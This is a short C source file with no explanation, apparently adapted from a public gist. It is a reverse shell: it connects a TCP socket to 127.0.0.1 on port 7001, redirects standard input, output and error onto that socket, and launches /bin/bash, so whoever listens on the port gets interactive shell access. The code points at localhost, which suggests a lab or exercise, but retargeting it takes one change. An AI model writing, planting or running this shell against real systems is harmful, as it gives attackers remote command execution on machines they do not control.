#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>  

// shamelessly adapted from https://gist.github.com/0xabe-io/916cf3af33d1c0592a90

int main() {
    int send_socket = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(7001);
    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    connect(send_socket, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    dup2(send_socket, 0);
    dup2(send_socket, 1);
    dup2(send_socket, 2);
    char *arguments[] = {"/bin/bash", NULL};
    execve("/bin/bash", arguments, NULL);
}

